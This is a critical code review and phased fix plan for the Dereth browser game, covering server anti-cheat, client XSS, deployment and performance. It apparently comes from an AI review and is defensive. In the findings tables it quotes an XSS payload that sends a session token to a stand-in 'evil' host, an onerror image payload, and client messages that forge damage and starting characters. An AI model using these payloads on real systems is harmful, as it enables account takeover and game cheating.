# Dereth — Full-Project Critical Code Review (2026-07-13)

Scope: entire project — client (`index.html`, 34,508 lines), server (`server/dereth_server.py`,
3,015 lines), asset-export tools (`tools/`), deploy/ops (`deploy/`, `sw.js`, nginx, systemd), and repo
hygiene. Reviewed through five independent lenses (client security, client architecture, client
performance, server, tooling/deploy). **This document is review + plan only — no code was changed.**

## Verdict up front

This is a **mature, defensively-written codebase**, not a neglected one — parameterized SQL everywhere,
per-message exception isolation on the server, a working 30-FPS graphics auto-governor, careful GPU
disposal, ~3,580 rationale comments tied to issue numbers, and a long history of adversarial test sweeps.
The problems that remain are **structural-scale** (one giant file, one giant function) and **trust-model**
(the server is authoritative over *some* state but trusts the client for combat, movement, and the initial
character), not sloppiness.

The single most important theme: **the server is not authoritative over the things players cheat at.**
Damage, position, HP, and the entire starting character are client-controlled. Everything in Phase 1 below
exists to close that.

---

## Priority-ranked findings

Severity is impact × reachability. "Known" = already tracked in `remaining-work-consolidated.md`.

### CRITICAL — anti-cheat / server authority

| ID | Finding | Evidence | Fix |
|----|---------|----------|-----|
| S1 | **Client-supplied damage trusted**, clamped only to 1.5× the mob's *max* HP → one-shot any boss (`{t:"attack",dmg:13500}` kills 9000-HP Bael'Zharon). Kill XP is credited authoritatively and **unthrottled** → unlimited power-leveling. | `dereth_server.py:1656-1663`, dispatch `:2555-2558`; `credit_xp:524-538` | Recompute damage server-side from authoritative weapon/skill/level, or cap per-hit to a small level-derived multiple **and** enforce a server-side per-mob attack cooldown. The `mhp*1.5` clamp is the bug — it authorizes a one-shot. |
| S2 | **Entire initial character save adopted wholesale.** `create_char` with `char={"gold":2e9,"level":275,"skills":{maxed},"inv":[500 items]}` persists and becomes authoritative on `play_char`. Rate limiters only bound *post-load deltas*; the seed bypasses all of them. `sanitize_save` clamps gold to 2e9 (not 0) and level to 275. Fuzz tests only ever send `char:{}`, so this path is untested. | `load_econ:540-549`, `create_char_slot:343-361`, `sanitize_save:382-426` | For a **newly created** slot, ignore client economy fields and issue a server-defined starter (gold=start, level=1, xp=0, starter inv). Only *existing* saves (bounded when earned) should seed `load_econ`. |
| S3 | **Player position unvalidated** — only NaN/Inf rejected. Set any finite coord each tick → teleport anywhere / instant-close on any mob or player. This **defeats every range gate in the game** (attack, trade, cast, PvP, pickup), so it compounds S1. | `dereth_server.py:2529-2530` | Clamp to ±`WORLD_LIMIT`; reject a move whose delta exceeds `maxSpeed × dt × slack`; snap back to last valid position. |

### HIGH — server authority (design-acknowledged as "M3", still live)

| ID | Finding | Evidence | Fix |
|----|---------|----------|-----|
| S4 | **Client-authoritative HP & death** → trivial god-mode (ignore inbound `{t:"dmg"}`, keep reporting `hp:100`). | `:2532`; mob dmg sent to victim `:1634-1637` | Server-side HP pool; apply mob damage authoritatively; server declares death. |
| S5 | **PvP damage fully client-authored** (relayed if `0<dmg<=2000`), both attacker-spoof and victim-ignore. | `:2690-2699` | Server-computed PvP damage vs server HP (folds into S4). |
| S6 | **Item forgery laundered to honest players.** `cl.inv` is seeded from the client save (S2) and never server-minted; trade/market relay forged legendaries to others. Consignment market doesn't debit buyer / take item server-side. | `:626-641`, `:2230-2289`; comment "client mints ALL items locally" `:557` | True server-authoritative item minting (server assigns IDs on server-resolved loot/craft), or explicitly document that item authenticity is unsolved. |

### HIGH — client XSS (latent: requires a malicious/compromised server today, but the session token lives in localStorage so any hole = account takeover)

| ID | Finding | Evidence | Fix |
|----|---------|----------|-----|
| X1 | **`esc()` does not escape `"` or `'`** → attribute-context XSS. `title="${esc(it.name)}"` with a name like `Sword" onmouseover="fetch('//evil/?t='+localStorage.dereth_token)` injects a live handler — no `<` needed. | `esc` at `index.html:31855`; sinks `32337, 31568, 31347, 31563` | One-line fix — add `"` and `'` to the escape set; closes all four sites at once. |
| X2 | **Item names rendered with no escaping at all** (text-context). A `<img src=x onerror=…>` name executes on pickup and on every inventory render. `examineHTML` already escapes correctly — the row labels don't. | `lootItem:31330`, `rarityName:16498`, shop row `26088` | Wrap network item names in `esc()` at these sinks; mirror `examineHTML`. |
| X3 | **`{t:"save"}` is client-authored economy state** (gold/level/xp/inv). Same root as S2 from the client side. | `saveGame:31659-31684`, send `:31681` | Server owns gold/level/inv; save payload should carry only cosmetic/preference state. |

### HIGH — ops / deploy resilience

| ID | Finding | Evidence | Fix |
|----|---------|----------|-----|
| O1 | **No CI gate on a 3 MB single-file live site.** One unclosed brace takes `www.derethgame.com` fully down; nothing checks before deploy. | no `.github/`, no pipeline | GitHub Actions on push/PR: jsc/node `--check` on `index.html`+`sw.js`, `py_compile` server+tools, run `tsa_persist.py`/`test_client.py`, fail on error. |
| O2 | **Non-atomic deploy, no rollback, restart-loop risk.** `update.sh` does an in-place `git pull` on the live docroot (torn reads) then `systemctl restart`; a crash-on-boot commit restart-loops every 2 s (`Restart=always,RestartSec=2`) with no revert. | `deploy/update.sh:5-8`, `dereth.service:15` | Release-dir + atomic symlink swap (`ln -sfn`); add `StartLimitIntervalSec`/`StartLimitBurst`; `update.sh` verifies `systemctl is-active` and rolls the symlink back on failure. |
| O3 | **Stale-cache class of bugs.** Mutable asset packs use stable filenames cached by a hand-bumped `V` (`sw.js:20`) *and* nginx `immutable` for 30 days. Forget the bump (or the browser honors `immutable`) → players run old meshes. Already bit you once (Horse.glb / index.html). | `sw.js:20,58-63`; `nginx-dereth.conf:47-51` | Content-address mutable packs (`Horse.a1b2c3.glb`). Then `immutable` is correct and the manual `V` ritual is retired: new content = new URL = guaranteed fresh. |

### HIGH — client maintainability / performance

| ID | Finding | Evidence | Fix |
|----|---------|----------|-----|
| A1 | **One 34,508-line / 3.1 MB file** amplifies every other issue (merge conflicts, no boundaries, full parse before first paint). | 1,535 top-level functions, 652 top-level decls | Classic (non-module) scripts **share one global scope across files** → the giant script can be cut into ordered `<script src>` includes with **zero code changes**. Incremental, revertable. |
| A2 | **Duplicated mob-render loop already drifting.** Local (`19140-19148`) vs networked (`32170-32187`) mob loops duplicate rig/position/scale/health-bar and have diverged (`m.ang` vs `m.yaw`; only one clamps `hp/mhp`; different bar-visibility tests). | `19140`, `32170` | Extract `renderMobFrame(m, dt, moving)` called from both; reconcile drift deliberately. (Note: my own targeting fix earlier had to edit *both* copies — this is exactly the trap.) |
| P1 | **`updateHUD()` runs ~63 DOM lookups every frame**, unconditionally, with per-slot nested `querySelector`, dirtying layout even when values are unchanged (~3,780 DOM ops/sec). | `index.html:19811+`, called `:20281` | Throttle to ~10 Hz (accumulator, like `streamMonsters`); cache refs at init; dirty-check writes (`if(el._v!==v)`). Biggest easy CPU win. |
| P2 | **Frustum culling globally disabled on all skinned monsters & NPCs** (`frustumCulled=false`) — every streamed creature is drawn + skinned even off-screen. Justified only for the *instanced* forest/grass/rain pools. | clone sites `2114, 2186, 9807, 11439, 12264, 24831` | Remove `frustumCulled=false` from the per-creature/per-person sites (keep it on the instanced pools); ensure a sane bounding sphere. |

### MEDIUM

| ID | Finding | Evidence | Fix |
|----|---------|----------|-----|
| S7 | Login flood: `login` skips `valid_name`, so unbounded unique usernames grow `_LOGIN_FAILS` (memory DoS) + a decoy scrypt each (CPU). Also registration spam, free `debuff` re-slow, no DB backup, `NPC_VASSALS` not cleared on delete. | `:2462-2468, 222-226, 2634-2647, 2521` | Length-cap login user; per-IP login/register throttle distinct from the general bucket; prune `_LOGIN_FAILS`; periodic `VACUUM INTO` backup; `NPC_VASSALS.pop(freed,None)` on delete. |
| X4 | Session token in plaintext localStorage (XSS amplifier); chat channel color from settings injected unescaped into `style`. | `32218`, `11547` | Fixing X1/X2 is the real mitigation; validate color against `#rrggbb`; length-cap/char-restrict all network strings at ingest. |
| P3 | Mobile boots at Ultra (tier 3): native-res × 4×MSAA × bloom+SSAO+god-rays × two 4096² shadows before the governor warms up → guaranteed early stutter. | `applyGfxTier(3):5140`, `mobilePixelRatio:4204-4210`, MSAA `:4551` | On touch, drop MSAA 4→2 (or 0) when pixel-ratio override is active and/or shadow 4096→3072; start auto at tier 2 and let `_hi` promote. |
| P4 | Hot-path allocations: 2× `new THREE.Vector3` per oriented projectile per frame; `textSprite()` uploads a fresh `CanvasTexture` per damage floater; `burst()` news N `SpriteMaterial` per call. | `18938-18939`, `11547`, `11557` | Hoist scratch vectors (`_UP`,`_dir` — pattern already used by `_lpV`/`_sunNDC`); cache floater textures by `txt+color` (LRU); pool burst sprites. |
| A3 | `update()` is a 541-line god-function (max indent ~28); the render try/catch swallows any bug inside to `console.error`, silently degrading gameplay. | `18742-19283` | Extract `stepPlayer/stepMobs/stepProjectiles/stepStatus` called in sequence — mechanical given global scope; absorbs A2. |
| A4 | **89 empty `catch(e){}`** — most defensive, but some wrap real subsystem calls (`loadACBody`, `buildTinker`, anim-stop) so genuine failures are invisible. | 89 sites; e.g. `5481, 10557, 16862, 12244` | Keep silent swallow only for storage/feature-probe; give subsystem catches a `console.warn("<sys> failed", e)`. |
| T1 | Tools not reproducible by a stranger: no pinned source-dat version/hash, no `tools/README`, no deps manifest; the `DatReader` BTree parser is **copy-pasted into 5 scripts**. | `ac_dat_export.py:19-20` et al. | `tools/README.md` (dat build + SHA256, pip deps, run order); extract shared `tools/acdat.py`. |
| O4 | No security headers (HSTS / X-Content-Type-Options / X-Frame-Options); `sw.js` has no explicit cache header. | `nginx-dereth.conf` (none found) | Add the three `add_header … always;` at server scope (mind nginx per-location `add_header` inheritance); `location = /sw.js { add_header Cache-Control "no-cache"; }`. |
| R1 | **1.0 GB `.git`** (509 MB packed); all of `assets/` (16,639 files, incl. 96 MB music) is in history — every binary re-export bloats it forever; the droplet clone pulls ~1 GB. | `git count-objects`, `git ls-files assets` | Git-LFS for `assets/**/*.{png,glb,mp3,ogg}` **or** move heavy packs (music, texture source) to a CDN/rsync origin; at minimum stop adding new binaries to history. |

### LOW / hygiene (fast, zero-risk)

| ID | Finding | Evidence | Fix |
|----|---------|----------|-----|
| R2 | **`acdata/client_local_English.dat` is committed** (tracked) despite `.gitignore` saying "AC client data — never commit." Turbine-owned data sitting in public history — a **licensing exposure**. | `git ls-files acdata/` → 1 file | `git rm --cached acdata/client_local_English.dat` (keep on disk); it's already covered by the `acdata/` ignore rule. Full history purge only if the licensing concern warrants a `filter-repo`. |
| R3 | **`assets/client_highres.dat` (127 MB) is untracked *and not gitignored*** — a 2013 Turbine source blob, referenced by nothing, one `git add -A` from permanent 127 MB history bloat; also 127 MB of dead weight if rsynced into the served web root. | `git check-ignore` → not ignored; grep → 0 refs | Add `assets/*.dat` to `.gitignore`; exclude from deploy rsync. |
| R4 | Stray macOS Finder copies in the game tree: `tools/ace_spell_effects 2.py`, `assets/acicons/06003367 2.png`, `assets/acicons/0600337b 2.png` (all untracked). `ace_spell_effects 2.py` is a stale near-dup that could be edited by mistake. | `find "* 2.*"` | Delete the three; add `* 2.*` to `.gitignore`. |
| P5/A5 | `Math.hypot`→`Math.sqrt(a*a+b*b)` in per-mob AI loops + squared-distance for the CAPITALS scan; pool light-pool candidate objects; central `LS` registry for the scattered localStorage key strings. | `19137-19138, 4186`; keys `dereth_keys/_mini/_rail/_ui/_token/_user` | Opportunistic micro-wins. |
| Q1 | Client regression tests (16 `tools/test_*.js` puppeteer harnesses) are effectively unrunnable/ungated — no `node`/`npm` here, no aggregator, no CI; the hard-won rAF-chain (#227/#501) and shared-mob fixes can silently rot. | `tools/test_*.js`; `.github` absent | Add `tools/run_all_tests.js` + a jsc offline parse-smoke gate (folds into O1); cover render-loop + save/load round-trip. |

### Cleared / strengths (explicitly do NOT "fix")

- **No `eval`/`Function`/`document.write`/`postMessage`;** credentials sent only over `wss://`, never
  stored/logged/URL'd. Player free-text (chat/tells/`/me`/emote/names) **is** consistently `esc()`'d and
  server name-validated — X1/X2 are latent, not peer-reachable today.
- **Server:** no SQL injection (all parameterized), no data races (single asyncio loop, DB via `to_thread`),
  trade cutover has no TOCTOU (#313), market buy is atomic, strong input robustness (NaN/Inf reject, size
  caps, slowloris timeouts), scrypt+salt+timing-safe auth.
- **Client perf:** asset delivery is genuinely streamed/lazy (the 2.1 GB is repo/source, **not** client
  bandwidth — critical path is ~3 MB html + 668 KB three.js + streamed packs); GPU disposal is careful and
  leak-free; the graphics governor works.
- **Deploy:** systemd hardening is solid (non-root, `NoNewPrivileges`, `ProtectSystem=strict`, loopback
  game port); nginx `/ws` proxy is correct (upgrade headers, 3600 s timeouts, per-IP `limit_conn`/`limit_req`);
  `/(server|deploy|\.git)/` denied. Render-loop try/catch + single rAF-chain guard are hard-won — preserve.

---

## Implementation plan — phased, non-breaking

Ordered by (risk-adjusted value). Each phase is independently shippable and verifiable with the existing
workflow (jsc syntax check → Browser-pane runtime check → commit per verified change). **Nothing here
requires a build toolchain, npm, or ES modules** — those would risk the working game for marginal gain.

### Phase 0 — Zero-risk hygiene (hours, no gameplay surface)
Do these first; they're pure wins and unblock the rest.
1. `git rm --cached acdata/client_local_English.dat` (R2 — stop tracking Turbine data).
2. Add `assets/*.dat` + `* 2.*` to `.gitignore`; delete the three stray `" 2"` files (R3, R4).
3. nginx: add HSTS / `nosniff` / `X-Frame-Options` + `sw.js` `no-cache` (O4).
4. **Client XSS one-liner + item-name escaping** (X1, X2) — tiny diff, closes the whole latent-XSS class;
   verify a `"`/`<` in an item name renders inert.

### Phase 1 — Anti-cheat / server authority (the headline; server-only, no client gameplay risk)
Highest value. Ship one at a time, each with a `tsa_*.py` regression that asserts the exploit is now rejected
(the fuzz suite's `char:{}`-only coverage is why S2 slipped — close that gap).
1. **S3 movement validation** first (clamp + max-delta) — it underpins every range gate, cheap, low-risk.
2. **S1 damage authority** — recompute or cap-per-hit + server attack cooldown; throttle `credit_xp`.
3. **S2 / X3 starter-state** — new slots get server-defined gold/level/xp/inv; only existing saves seed `load_econ`.
4. **S7 auth hardening** — login name cap, per-IP login/register throttle, prune `_LOGIN_FAILS`.
5. **S4/S5 authoritative HP & damage** (the "M3" work) — larger; server HP pool + server-declared death.
   **S6 item minting** is the biggest lift; scope it after S1–S5 or explicitly document item authenticity as
   an accepted limitation.

### Phase 2 — Ops resilience (protect the live site)
1. **O1 CI gate** — jsc/node `--check` + `py_compile` + `tsa_persist.py` on push/PR (also lands Q1).
2. **O2 atomic deploy + rollback** — release-dir + symlink swap; systemd `StartLimit*`; post-restart health check.
3. **O3 content-addressed assets** — hash mutable packs; retire the manual `V` bump; make nginx `immutable` correct.

### Phase 3 — Client performance quick wins (measurable, low-risk)
1. **P1 `updateHUD` throttle + dirty-check + ref-cache** — biggest easy CPU win.
2. **P2 re-enable frustum culling on skinned monsters/NPCs** (keep it off only on instanced pools).
3. **P4 hot-path allocations** — scratch vectors in projectile orient; floater-texture cache; burst-sprite pool.
4. **P3 mobile boot tier** — cap MSAA/shadow when the pixel-ratio override is active; start auto at tier 2 on touch.

### Phase 4 — Maintainability (incremental, each step revertable)
1. **A2 de-dupe the mob loop** → `renderMobFrame()` (do this *before* the file split; it removes a live drift trap).
2. **A3 break up `update()`** → `stepPlayer/stepMobs/stepProjectiles/stepStatus`.
3. **A1 physical file split** — cut the giant `<script>` into ordered `js/*.js` includes (data tables → world →
   combat → ui → net → crafting) + `css/game.css`, a few files at a time, verifying boot after each.
4. **A4 empty-catch logging sweep**; add a duplicate-top-level-declaration lint (catches the `yaw is not defined` class).

### Phase 5 — Longer-horizon / opportunistic
1. **R1 binary-in-git** — Git-LFS or CDN/rsync for `assets/**` heavy packs (esp. music); stop growing the 1 GB `.git`.
2. **T1 tools** — `tools/README.md` (pinned dat + deps + run order) + extract shared `tools/acdat.py`.
3. **P5/A5** — `Math.hypot`→`sqrt` + squared-distance in AI loops; light-pool object pool; `LS` key registry.

### Explicitly out of scope (would add risk, not value)
ES modules / `type=module` (breaks the ~1,000-global shared-scope assumption the file-split relies on), a
bundler, a UI framework. The classic-script file split gets ~80% of the maintainability benefit at ~5% of the risk.

---

*Generated from a five-lens parallel review at HEAD d151b2b6. Cross-referenced against
`remaining-work-consolidated.md`; S4/S5 (HP authority) overlap the tracked "M3" items, S2's forged-chargen
path and the two XSS defects are new.*
